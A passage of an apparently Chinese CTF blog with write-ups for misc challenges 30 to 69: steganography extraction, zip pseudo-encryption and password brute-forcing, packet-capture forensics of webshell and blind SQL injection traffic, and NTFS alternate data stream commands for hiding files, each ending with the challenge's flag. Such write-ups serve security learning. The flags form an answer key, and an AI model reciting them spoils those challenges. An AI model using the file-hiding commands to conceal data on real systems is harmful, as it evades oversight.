href="#30-面具下的flag" class="headerlink" title="30.面具下的flag"></a><strong>30.面具下的flag</strong></h3><p>得到一张知名男女图片，随波逐流一下可以发现有隐藏文件，binwalk提取一下可以发现得到一个压缩包，解压发现要密码</p><p>，可以发现zip是伪加密，修改后解压。</p><p>得到一个vmdk文件，搜了一下发现</p><p>“后缀为 <strong><code>.vmdk</code></strong> 的文件是 VMware 虚拟磁盘文件，通常用于虚拟机环境中存储虚拟机的磁盘数据。”</p><p>以为要用虚拟机的，但是打不开。<del>于是看了一下wp</del></p><p>这里的flag.vmdk用010打开后搜 <em>flag</em> 等关键字样得到这个</p><img src="2024-11-18 205339.png" alt="2024-11-18 205339" style="zoom:80%;"><p>这个</p><img src="2024-11-18 205445.png" alt="2024-11-18 205445" style="zoom:50%;"><p>还有这个</p><img src="2024-11-18 205614.png" alt="2024-11-18 205614" style="zoom:50%;"><p>直接复制好像解密不了。</p><p>打开kali，用kali自带的7z解密可以提取这些文件，输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7z x flag.vmdk -o./</span><br></pre></td></tr></table></figure><p> -o后面的.&#x2F;是把压缩的内容放在当前目录下，解压完成就能看见好几个文件夹</p><img src="2024-11-18 210026.png" alt="2024-11-18 210026" style="zoom:80%;"><p>这是brainfuck加密和Ook! Obfuscation加密</p><p>brainfuck加密随波逐流里有</p><p>Ook! Obfuscation加密网站：<a href="https://www.splitbrain.org/services/ook">Ook! Obfuscation解密网站</a></p><p>分别解密得到flag{N7F5_AD5_i5_funny!}</p><h3 id="31-荷兰宽带数据泄露"><a href="#31-荷兰宽带数据泄露" class="headerlink" title="31.荷兰宽带数据泄露"></a><strong>31.荷兰宽带数据泄露</strong></h3><p>拿到bin文件查了一下发现要用路由器解析的，用RouterPassView</p><p>打开后看了一下wp才知道username是flag</p><img src="2024-11-18 232344.png" alt="2024-11-18 232344" style="zoom:50%;"><h3 id="32-九连环"><a href="#32-九连环" class="headerlink" title="32.九连环"></a><strong>32.九连环</strong></h3><p>拿到jpg用010看一下，发现后面有压缩包隐藏的</p><p>先试一下随波逐流的binwalk提取，失败了，没提出来</p><p>于是我们用kali的binwalk</p><p>![2024-11-19 002930](.&#x2F;Misc-Record&#x2F;2024-11-19 002930.png)</p><p>（不知道为什么我的binwalk要加一个–run-as&#x3D;root提升权限。。）</p><p>提取出来的一个图片和一个压缩包，猜测密码在图片的隐写里</p><p>用steghide跑一下，真的在里面，提取</p><img src="2024-11-19 003229.png" alt="2024-11-19 003229" style="zoom:80%;"><p>查看它，下面的就是密码</p><img src="2024-11-19 003329.png" alt="2024-11-19 003329" style="zoom:80%;"><p>直接用密码解压压缩包就能看到flag：flag{1RTo8w@&amp;4nK@z*XL}</p><h3 id="33-认真你就输了"><a href="#33-认真你就输了" class="headerlink" title="33.认真你就输了"></a><strong>33.认真你就输了</strong></h3><p>这题我学到了ms-office文件本质是zip</p><p>MS-Office文件word、excel、ppt本质都是zip文件，就可以隐写。把01.xls重命名为01.zip，解压缩后在 xl&#x2F;charts 目录里有 flag.txt </p><h3 id="34-被劫持的神秘礼物"><a href="#34-被劫持的神秘礼物" class="headerlink" title="34.被劫持的神秘礼物"></a><strong>34.被劫持的神秘礼物</strong></h3><p>拿到pcapng文件用wireshark打开，这里可以使用http.request.method&#x3D;&#x3D;POST进行过滤或者一个个点开看，发现</p><p>![2024-11-19 113909](.&#x2F;Misc-Record&#x2F;2024-11-19 113909.png)</p><p>得到账号密码adminaadminb，包上小写md5，flag{1d240aafe21a86afc11f38a45b541a49}</p><h3 id="35-被偷走的文件"><a href="#35-被偷走的文件" class="headerlink" title="35.被偷走的文件"></a><strong>35.被偷走的文件</strong></h3><p>提到偷走文件一般要清楚是找HTTP或者FTP，看到导出对象里有FTP-DATA，保存这个flag.rar</p><img src="2024-11-19 115640.png" alt="2024-11-19 115640" style="zoom:75%;"><p>保存下来发现要密码解压，爆破可以发现，密码是5790，得到flag</p><h3 id="36-藏藏藏"><a href="#36-藏藏藏" class="headerlink" title="36.藏藏藏"></a><strong>36.藏藏藏</strong></h3><p>得到一个jpg，用随波逐流的formost提取，得到一个zip，打开是个xlsx，一张二维码，用QR扫码得到flag</p><img src="2024-11-19 120348.png" alt="2024-11-19 120348" style="zoom:50%;"><h3 id="37-佛系青年"><a href="#37-佛系青年" class="headerlink" title="37.佛系青年"></a><strong>37.佛系青年</strong></h3><p>拿到的zip拖进随波逐流看一下，发现第一个jpg无加密，第二个txt伪加密，修复一下</p><p>jpg上说我FFF佛慈悲，txt内容为</p><img src="2024-11-19 121044.png" alt="2024-11-19 121044" style="zoom:67%;"><p>发现是与佛论禅编码，随波逐流得到flag</p><h3 id="38-你猜我是个啥"><a href="#38-你猜我是个啥" class="headerlink" title="38.你猜我是个啥"></a><strong>38.你猜我是个啥</strong></h3><p>随波逐流一把梭</p><h3 id="39-刷新过的图片"><a href="#39-刷新过的图片" class="headerlink" title="39.刷新过的图片"></a><strong>39.刷新过的图片</strong></h3><p>关键词“刷新”，很可能是F5-steganography加密，尝试解密</p><img src="2024-11-19 122828.png" alt="2024-11-19 122828" style="zoom:80%;"><p>我这里不知道为什么还要加上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--add-opens java.base/sun.security.provider=ALL-UNNAMED</span><br></pre></td></tr></table></figure><p>才能F5解密。。</p><p>得到一个txt文件，打开是乱码，却能看到首两个字母PK，改后缀为zip，解压</p><p>需要密码，发现是伪加密，随波逐流修复一下得到flag：flag{96efd0a2037d06f34199e921079778ee}</p><h3 id="40-秘密文件"><a href="#40-秘密文件" class="headerlink" title="40.秘密文件"></a><strong>40.秘密文件</strong></h3><p>winshark打开，查看了一下http，ftp-data，啥也没有。。</p><p>过滤tcp流，看到提示，追踪tcp，发现隐藏了一个rar文件</p><img src="2024-11-19 124139.png" alt="2024-11-19 124139" style="zoom:80%;"><p>用随波逐流的binwalk提取文件，得到rar，爆破密码发现是1903，得到flag：flag{d72e5a671aa50fa5f400e5d10eedeaa5}</p><h3 id="41-鸡你太美"><a href="#41-鸡你太美" class="headerlink" title="41.鸡你太美"></a><strong>41.鸡你太美</strong></h3><p>得到的zip一个是gif，另一个是损坏的gif，010打开发现缺少文件头，补上文件头即可拿到gif</p><img src="2024-11-19 143150.gif" alt="2024-11-19 143150" style="zoom:50%;"><p>这里注意flag不是zhi-yin-you-are-beautiful，不知道为啥是下划线zhi_yin_you_are_beautiful</p><p>得到flag：flag{zhi_yin_you_are_beautiful}</p><h3 id="42-just-a-rar"><a href="#42-just-a-rar" class="headerlink" title="42.just_a_rar"></a><strong>42.just_a_rar</strong></h3><p>得到的zip解压得到四位数.zip，直接爆破得到密码2016</p><p>拿到一张flag.jpg，拖进随波逐流得到flag</p><h3 id="43-snake"><a href="#43-snake" class="headerlink" title="43.snake"></a><strong>43.snake</strong></h3><p>拿到zip得到一个jpg，发现有隐藏文件</p><p>binwalk提取文件得到一个zip，zip里面是cyber和key</p><p>key里面是V2hhdCBpcyBOaWNraSBNaW5haidzIGZhdm9yaXRlIHNvbmcgdGhhdCByZWZlcnMgdG8gc25ha2VzPwo&#x3D;</p><p>base64解密得到</p><p>What is Nicki Minaj’s favorite song that refers to snakes?</p><p>搜了一下是anaconda，所以这是真正的key</p><p>而cyber是serpent加密，解密网址<a href="http://serpent.online-domain-tools.com/">http://serpent.online-domain-tools.com</a></p><p>解密得到flag</p><img src="2024-11-19 143133.png" alt="2024-11-19 143133" style="zoom:50%;"><p>flag：flag{who_knew_serpent_cipher_existed}</p><h3 id="44-菜刀666"><a href="#44-菜刀666" class="headerlink" title="44.菜刀666"></a><strong>44.菜刀666</strong></h3><p>放进随波逐流用formost提取出一个zip，但是要密码，而且爆破不出来</p><p>又看pcanp，过滤http.request.method&#x3D;&#x3D;POST</p><img src="2024-11-19 145901.png" alt="2024-11-19 145901" style="zoom:75%;"><p>发现1068的传了FF D8 FF E0 00 10 4A 46 49 46 00 01 ( JPG的文件头 )</p><p>复制下来进入010新建一个文件，保存图片得到</p><img src="2024-11-19 150455.png" alt="2024-11-19 150455" style="zoom:50%;"><p>得到密码：Th1s_1s_p4sswd_!!!</p><p>解压得到flag：flag{3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z}</p><h3 id="45-一叶障目"><a href="#45-一叶障目" class="headerlink" title="45.一叶障目"></a><strong>45.一叶障目</strong></h3><p>随波逐流一把梭</p><img src="2024-11-19 151204.png" alt="2024-11-19 151204" style="zoom: 33%;"><h3 id="46-神奇的二维码"><a href="#46-神奇的二维码" class="headerlink" title="46.神奇的二维码"></a><strong>46.神奇的二维码</strong></h3><p>得到一张二维码，CQR扫一下发现不是flag</p><img src="2024-11-19 151704.png" alt="2024-11-19 151704" style="zoom:50%;"><p>拖进随波逐流binwalk提取一下文件得到716A.rar 7104.rar 17012.rar 18394.rar</p><p>1.7104.rar</p><p>解压得到encode.txt</p><p>里面是YXNkZmdoamtsMTIzNDU2Nzg5MA&#x3D;&#x3D;</p><p>base64解密一下是asdfghjkl1234567890</p><p>没用，看下一个。。</p><p>2.716A</p><p>解压得到一张 “已经可以了大佬你现在这个情况证明你已经无敌了” 的图片和一个看看flag在不在里面^_^.zip</p><p>用asdfghjkl1234567890解密zip，又得到一个 “已经可以了大佬你现在这个情况证明你已经无敌了” 的图片</p><img src="2024-11-19 152700.png" alt="2024-11-19 152700" style="zoom:33%;"><p>没用，看下一个。。</p><p>3.17012.zip</p><p>解压得到一个flag.doc，里面是很长的字符</p><p>需要多次解码base64，网上找了个脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">def decode(f):</span><br><span class="line">n = 0;</span><br><span class="line">while True:</span><br><span class="line">try:</span><br><span class="line">f = base64.b64decode(f)</span><br><span class="line">n += 1</span><br><span class="line">except:</span><br><span class="line">print(&#x27;[+]Base64共decode了&#123;0&#125;次，最终解码结果如下:&#x27;.format(n))</span><br><span class="line">print(str(f,&#x27;utf-8&#x27;))</span><br><span class="line">break</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">f = open(&#x27;e:/Python 3.13/ccc.txt&#x27;,&#x27;r&#x27;).read()</span><br><span class="line">decode(f)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>跑一下脚本</p><img src="2024-11-19 160040.png" alt="2024-11-19 160040" style="zoom:50%;"><p>得到如下：comEON_YOuAreSOSoS0great</p><p>下一个。。。</p><p>4.18394.rar</p><p>用comEON_YOuAreSOSoS0great去解密rar，得到一串音频，拖进aud</p><img src="2024-11-19 160454.png" alt="2024-11-19 160454" style="zoom:75%;"><p>明显看出来是摩斯密码，手敲代码得</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--/---/.-./..././../.../...-/./.-./-.--/...-/./.-./-.--/./.-/.../-.--</span><br></pre></td></tr></table></figure><p>解密最后得到flag：flag{morseisveryveryeasy}     (要注意是小写)</p><p>ps：这道题好烦。。</p><h3 id="47-纳尼"><a href="#47-纳尼" class="headerlink" title="47.纳尼"></a>47.纳尼</h3><p>拿到文件打不开一看就是缺少文件头，010里面补上47 49 46 38得到gif</p><img src="2024-11-19 160490.gif" alt="2024-11-19 160490" style="zoom: 50%;"><p>用随波逐流分解帧间隔，得到Q1RGe3dhbmdfYmFvX3FpYW5nX2lzX3NhZH0&#x3D;</p><p>base64解码得CTF{wang_bao_qiang_is_sad}，则flag：flag{wang_bao_qiang_is_sad}</p><h3 id="48-excel破解"><a href="#48-excel破解" class="headerlink" title="48.excel破解"></a>48.excel破解</h3><p>随波逐流一把梭</p><h3 id="49-来题中等的吧"><a href="#49-来题中等的吧" class="headerlink" title="49.来题中等的吧"></a>49.来题中等的吧</h3><p>义眼顶针，鉴定为morse</p><img src="2024-11-19 200000.png" alt="2024-11-19 200000" style="zoom:80%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.-/.-../.--./..../.-/.-../.-/-...</span><br></pre></td></tr></table></figure><p>解密得ALPHALAB</p><p>则flag{alphalab}</p><h3 id="50-梅花香自苦寒来"><a href="#50-梅花香自苦寒来" class="headerlink" title="50.梅花香自苦寒来"></a>50.梅花香自苦寒来</h3><p>拿到png先用随波逐流跑一下，得到一串坐标，猜测是画图</p><img src="2024-11-20 212245.png" alt="2024-11-20 212245" style="zoom:50%;"><p>网上找了一下，找到了gnuplot来画图，不过我们先要把括号和逗号去掉，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;E:\meihuai.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> res:  <span class="comment"># 坐标格式文件比如(7,7)</span></span><br><span class="line">    re = res.read()</span><br><span class="line">    res.close()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;E:\output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> gnup:   <span class="comment"># 将转换后的坐标写入output.txt</span></span><br><span class="line">    re = re.split()</span><br><span class="line">    tem = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(re)):</span><br><span class="line">        tem = re[i]</span><br><span class="line">        tem = tem.lstrip(<span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">        tem = tem.rstrip(<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(tem)):</span><br><span class="line">            <span class="keyword">if</span> tem[j] == <span class="string">&#x27;,&#x27;</span>:</span><br><span class="line">                tem = tem[:j] + <span class="string">&#x27; &#x27;</span> + tem[j+<span class="number">1</span>:]</span><br><span class="line">        gnup.write(tem + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    gnup.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>去掉括号和逗号后用gnuplot画图</p><img src="2024-11-20 212012.png" alt="2024-11-20 212012" style="zoom:80%;"><p>画完图后得到一个二维码，CQR扫一下得到flag：flag{40fc0a979f759c8892f4dc045e28b820}</p><h3 id="51-谁赢了比赛？"><a href="#51-谁赢了比赛？" class="headerlink" title="51.谁赢了比赛？"></a>51.谁赢了比赛？</h3><p>拿到png用binwalk提取文件得到一个zip，有密码</p><p>arp爆破得到密码是1020</p><p>解压是一张gif，逐帧分解得到很多张棋谱和一张奇怪的图片</p><img src="2024-11-20 212250.png" alt="2024-11-20 212250" style="zoom:33%;"><p>图片stegsolve一下在Red plane0得到一张二维码</p><p>CQR扫一下</p><img src="2024-11-20 215047.png" alt="2024-11-20 215047" style="zoom:33%;"><p>得到flag：flag{shanxiajingwu_won_the_game}</p><h3 id="52-ACTF新生赛2020-outguess"><a href="#52-ACTF新生赛2020-outguess" class="headerlink" title="52.[ACTF新生赛2020]outguess"></a>52.[ACTF新生赛2020]outguess</h3><p>拿到一堆东西，txt里让我们guess一下flag在哪，一看就很明显是旁边的mmm.jpg里</p><p>而且是outguess隐写</p><p>这里我们要注意的是直接去无密文outguess会显示</p><blockquote><p>[!WARNING]</p><p>Extracted datalen is too long</p></blockquote><p>说明是有密文的</p><p>发现吗，mmm.jpg的属性里面有：公正民主公正文明公正和谐</p><p>社会主义核心价值观解码:  abc</p><p>abc作为密文outguess.</p><img src="2024-11-20 215800.png" alt="2024-11-20 215800" style="zoom:80%;"><p>得到flag：flag{gue33_Gu3Ss!2020}</p><h3 id="53-WUSTCTF2020-find-me"><a href="#53-WUSTCTF2020-find-me" class="headerlink" title="53.[WUSTCTF2020]find_me"></a>53.[WUSTCTF2020]find_me</h3><p>一定一定要多看属性！</p><p>属性备注里面有盲文   ⡇⡓⡄⡖⠂⠀⠂⠀⡋⡉⠔⠀⠔⡅⡯⡖⠔⠁⠔⡞⠔⡔⠔⡯⡽⠔⡕⠔⡕⠔⡕⠔⡕⠔⡕⡍&#x3D;</p><p>随波逐流解密得到flag：flag{y$0$u_f$1$n$d$_M$e$e$e$e$e}</p><h3 id="54-穿越时空的思念"><a href="#54-穿越时空的思念" class="headerlink" title="54.穿越时空的思念"></a>54.穿越时空的思念</h3><p>得到音频听一下能在右声道发现明显的莫斯密码，手敲得</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..-./-----/..---/----./-.../-../-..../..-./...../...../.----/.----/...--/----./././-.././-.../---.././....-/...../.-/.----/--.../...../-.../-----/--.../---../-..../..-./-----/..---/----./-.../-../-..../..-./.....</span><br></pre></td></tr></table></figure><p>解密，得F029BD6F551139EEDEB8E45A175B0786F029BD6F5</p><p>取前32位小写得flag：flag{f029bd6f551139eedeb8e45a175b0786}</p><h3 id="55-SWPU2019-我有一只马里奥"><a href="#55-SWPU2019-我有一只马里奥" class="headerlink" title="55.[SWPU2019]我有一只马里奥"></a>55.[SWPU2019]我有一只马里奥</h3><p>得到一个exe，执行后得到1.txt，里面写着ntfs      flag.txt</p><p><del>有点不会了，看了下wp</del></p><p>查到了</p><blockquote><p>[!NOTE]</p><p>NTFS交换数据流（简称ADS）是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，除了主文件流之外还可以有许多非主文件流寄宿在主文件流中，而我们无法查看到非主文件数据流，因文件夹大小始终显示0</p></blockquote><p><strong>以下是进行文件流计生和查看的方法，以后在windows命令行下查看文件，都用 dir &#x2F;r</strong></p><blockquote><p>[!NOTE]</p><p>寄生一:</p><p>echo 写入内容&gt;&gt;宿主文件:交换数据流文件(寄生文件)</p><p>echo ever&gt;&gt;1.txt:2.txt</p><p>2.txt为echo创建出交换数据流文件，ever在2.txt中</p><p>寄生二:</p><p>type 交换数据流文件(寄生文件)&gt;&gt;宿主文件夹:交换数据流文件(寄生文件)</p><p>type 2.txt&gt;&gt;temp:2.txt</p><p>temp为空文件夹,执行后2.txt寄生在temp文件夹上</p><p>type a.jpg&gt;&gt;temp:a.jpg</p><p>temp为空文件夹,执行后a.jpg寄生在temp文件夹上</p><p>查看:</p><p>notepad 宿主文件:交换数据流文件(寄生文件）</p><p>notepad 1.txt:2.txt</p><p>查看图片文件:</p><p>mspaint 宿主文件:交换数据流文件(寄生文件)</p><p>notepad a.jpg:b.jpg</p><p>过滤</p><p>dir &#x2F;r | findstr $DATA （过滤DATA字符串）</p></blockquote><p>这道题应该是利用ntfs把flag.txt隐藏了</p><p>需要我们先建立一个文件夹来存放1.txt，再cmd，然后直接查看flag.txt</p><img src="2024-11-20 232606.png" alt="2024-11-20 232606" style="zoom:80%;"><p>运行这个notepad 1.txt:flag.txt后就能看到flag：flag{ddg_is_cute}</p><h3 id="56-GUET-CTF2019-KO"><a href="#56-GUET-CTF2019-KO" class="headerlink" title="56.[GUET-CTF2019]KO"></a>56.[GUET-CTF2019]KO</h3><p>打开文本是明显的Ook!加密</p><p>拖进在线网站直接解密就好（网站见Misc Ultra）</p><p>flag：flag{welcome to CTF}</p><h3 id="57-ACTF新生赛2020-base64隐写"><a href="#57-ACTF新生赛2020-base64隐写" class="headerlink" title="57.[ACTF新生赛2020]base64隐写"></a>57.[ACTF新生赛2020]base64隐写</h3><p>解压zip得到一个txt和hint</p><p>txt里面是多行base64加密过的，复制进随波逐流</p><p>选择“base64隐写解密”直接得到flag：flag{6aseb4_f33!}</p><p>（？？？</p><p>看了一下wp发现这题base64解密过后是一个python2脚本，需要复制进kali跑脚本出flag</p><p>没啥好说的，随波逐流太好用了。。还能顺手给你把脚本跑了。。</p><h3 id="58-MRCTF2020-ezmisc"><a href="#58-MRCTF2020-ezmisc" class="headerlink" title="58.[MRCTF2020]ezmisc"></a>58.[MRCTF2020]ezmisc</h3><p>随波逐流爆破宽高得</p><img src="2024-11-20 232690.png" alt="2024-11-20 232690" style="zoom:50%;"><p>flag：flag{1ts_vEryyyyyy_ez!}</p><h3 id="59-GXYCTF2019-gakki"><a href="#59-GXYCTF2019-gakki" class="headerlink" title="59.[GXYCTF2019]gakki"></a>59.[GXYCTF2019]gakki</h3><p>拿到wolaopo.jpg，发现有文件隐写</p><p>binwalk提取得到zip，有密码</p><p>arp爆破得密码是8864，拿到一个毫无规律的txt，里面如同乱码</p><p><del>查了一下wp</del></p><p>最后发现是要我们统计字符，利用puzzlesolver</p><img src="2024-11-20 234945.png" alt="2024-11-20 234945" style="zoom:50%;"><p>flag就是频率前几个的</p><p>flag：flag{gaki_IsMyw1fe}</p><p>（脑洞好大这题）</p><h3 id="60-HBNIS2018-caesar"><a href="#60-HBNIS2018-caesar" class="headerlink" title="60.[HBNIS2018]caesar"></a>60.[HBNIS2018]caesar</h3><p>全文：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">题目：caesar</span><br><span class="line"></span><br><span class="line">描述：gmbhjtdbftbs</span><br><span class="line"></span><br><span class="line">flag格式：XXX 明文</span><br><span class="line"></span><br><span class="line">提交：直接提交明文 （小写）</span><br></pre></td></tr></table></figure><p>直接凯撒解密得flagiscaesar</p><p>flag：flag{flagiscaesar}</p><h3 id="61-SUCTF2018-single-dog"><a href="#61-SUCTF2018-single-dog" class="headerlink" title="61.[SUCTF2018]single dog"></a>61.[SUCTF2018]single dog</h3><p>拿到jpg发现后接了文本，binwalk提取一下是个zip</p><p>解压得1.txt里面是一堆颜文字，查了一下是AAencode，除此之外还有jjencode、ppencode、rrencode、uuencode、xxencode</p><p>利用随波逐流解密即可，也可以用在线网站<a href="http://www.hiencode.com/">http://www.hiencode.com/</a></p><p>解码得flag：flag{happy double eleven}</p><h3 id="62-黑客帝国"><a href="#62-黑客帝国" class="headerlink" title="62.黑客帝国"></a>62.黑客帝国</h3><p>zip解压一下看到很长的txt，开头是52617221，是rar文件头</p><p>010存一下，得到rar，解压要密码，爆破得到3690</p><p>解压得到一个png，但是打不开，010看一下</p><img src="2024-11-21 001233.png" alt="2024-11-21 001233" style="zoom:80%;"><p>看出来后面JFIF是jpg的，且看到010最后面是FF D9</p><p>应该是修改了文件头，改回jpg即可</p><p>(PNG（png)文件头：89 50 4E 47　文件尾：AE 42 60 82）<br>(JPEG (jpg)文件头：FF D8 FF　　文件尾：FF D9　)</p><p>拿到图片</p><img src="2024-11-21 002034.png" alt="2024-11-21 002034" style="zoom:50%;"><p>flag：flag{57cd4cfd4e07505b98048ca106132125}</p><h3 id="63-HBNIS2018-低个头"><a href="#63-HBNIS2018-低个头" class="headerlink" title="63.[HBNIS2018]低个头"></a>63.[HBNIS2018]低个头</h3><p>全文：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">题目：低个头</span><br><span class="line"></span><br><span class="line">描述：EWAZX RTY TGB IJN IO KL 请破解该密文 f</span><br><span class="line"></span><br><span class="line">lag格式：XXX 明文</span><br><span class="line"></span><br><span class="line">提交：直接提交明文（大写）</span><br></pre></td></tr></table></figure><p>脑洞题。。。<del>查了一下wp</del></p><p>题目“低个头”的意思竟然是让你低头看键盘</p><p>而那些字母在键盘上组合起来组成CTF。。</p><p>所以flag：flag{CTF}</p><h3 id="64-SWPU2019-伟大的侦探"><a href="#64-SWPU2019-伟大的侦探" class="headerlink" title="64.[SWPU2019]伟大的侦探"></a>64.[SWPU2019]伟大的侦探</h3><p>zip是有密码的，而且爆破不出来</p><p>密码txt里面有一串乱码是密码</p><p>这里需要我们用010打开txt，而且在视图上选择EBCDIC（还不清楚为什么。。</p><img src="2024-11-21 003029.png" alt="2024-11-21 003029" style="zoom:80%;"><p>就能得到密码：wllm_is_the_best_team!</p><p>然后就得到了很多小人的图片</p><img src="2024-11-21 003448.png" alt="2024-11-21 003448" style="zoom:67%;"><p>这个对照表在 随波逐流&#x2F;其他工具&#x2F;更多图形密码（在线） 里面能找到</p><img src="2024-11-21 003944.png" alt="2024-11-21 003944" style="zoom:80%;"><p>对照出来是iloveholmesandwllm</p><p>flag：flag{iloveholmesandwllm}</p><h3 id="65-MRCTF2020-你能看懂音符吗"><a href="#65-MRCTF2020-你能看懂音符吗" class="headerlink" title="65.[MRCTF2020]你能看懂音符吗"></a>65.[MRCTF2020]你能看懂音符吗</h3><p>压缩包解压不了，010打开发现修改了文件头</p><p>改回来，解压，得到一个docx文档，里面没啥内容</p><p>将文档后缀改成zip，打开document.xml，看到</p><img src="2024-11-21 211756.png" alt="2024-11-21 211756" style="zoom:75%;"><p>是一串音乐加密的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">♭♯♪‖¶♬♭♭♪♭‖‖♭♭♬‖♫♪‖♩♬‖♬♬♭♭♫‖♩♫‖♬♪♭♭♭‖¶∮‖‖‖‖♩♬‖♬♪‖♩♫♭♭♭♭♭§‖♩♩♭♭♫♭♭♭‖♬♭‖¶§♭♭♯‖♫∮‖♬¶‖¶∮‖♬♫‖♫♬‖♫♫§=</span><br></pre></td></tr></table></figure><p>随波逐流解密得MRCTF{thEse_n0tes_ArE_am@zing~}</p><p>flag：flag{thEse_n0tes_ArE_am@zing~}</p><h3 id="66-我吃三明治"><a href="#66-我吃三明治" class="headerlink" title="66.我吃三明治"></a>66.我吃三明治</h3><p>得到一张三明治图片，formost一下还是一张三明治，010打开看到</p><img src="2024-11-21 212453.png" alt="2024-11-21 212453" style="zoom:75%;"><p>藏了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MZWGCZ33GZTDCNZZG5SDIMBYGBRDEOLCGY2GIYJVHA4TONZYGA2DMM3FGMYH2</span><br></pre></td></tr></table></figure><p>在两张图片之间（就像三明治一样。。</p><p>base32解码得flag：flag{6f1797d4080b29b64da5897780463e30}</p><h3 id="67-SWPU2019-你有没有好好看网课"><a href="#67-SWPU2019-你有没有好好看网课" class="headerlink" title="67.[SWPU2019]你有没有好好看网课"></a>67.[SWPU2019]你有没有好好看网课</h3><p>得到两个zip，第二个zip爆破密码是183792</p><p>打开得到docx和影流之主</p><p><del>脑洞题，查了一下wp</del></p><p>docx的内容是：</p><img src="2024-11-21 213717.png" alt="2024-11-21 213717" style="zoom:50%;"><p>提示我们在视频的5.20秒和7.11秒有问题</p><p>使用potplayer逐帧查看，分别看到</p><img src="2024-11-21 215024.png" alt="2024-11-21 215024" style="zoom:80%;"><p>和</p><img src="2024-11-21 215023.png" alt="2024-11-21 215023" style="zoom:80%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">..... ../... ./... ./... ../</span><br><span class="line">dXBfdXBfdXA=</span><br></pre></td></tr></table></figure><p>第一个是敲击码，第二个是base64</p><p>解码分别得wllm和up_up_up，拼接得到wllmup_up_up</p><p>这是第一个zip的解压密码</p><p>解压出来得到一张jpg，随波逐流得到flag：flag{A2e_Y0u_Ok?}</p><h3 id="68-ACTF新生赛2020-NTFS数据流"><a href="#68-ACTF新生赛2020-NTFS数据流" class="headerlink" title="68.[ACTF新生赛2020]NTFS数据流"></a>68.[ACTF新生赛2020]NTFS数据流</h3><p>这里需要注意的是解压软件的选择，不能用bandizip，否则会没有ntfs</p><p>建议选择winrar</p><p>winrar解压完zip后，直接 dir &#x2F;r ，过滤 $DATA字符串</p><p>看到有隐藏后直接notepad</p><img src="2024-11-21 235726.png" alt="2024-11-21 235726" style="zoom:80%;"><p>得到flag：flag{AAAds_nntfs_ffunn?}</p><h3 id="69-sqltest"><a href="#69-sqltest" class="headerlink" title="69.sqltest"></a>69.sqltest</h3><p>拿到文件进winshark分析一下发现是sql注入攻击</p><p>而且是sql盲注，它是用ascii码的大小比较来判断库名、表名、字段名和字段值的内容的</p><p>打开文件如下</p><img src="2024-11-22 003052.png" alt="2024-11-22 003052" style="zoom:50%;"><p>这里看出来是sql了，可以先过滤一下http流量</p><p>再选择 &#x2F;文件&#x2F;导出分组解析结果&#x2F;AS CSV</p><p>这样就可以把流量导出成表格。看得更清楚</p><img src="2024-11-22 003611.png" alt="2024-11-22 003611" style="zoom:75%;"><p>一般来说，前面的内容是hacker来判断数据库名、表名、字段名的，我们直接拉到最下面</p><p>![2024-11-22 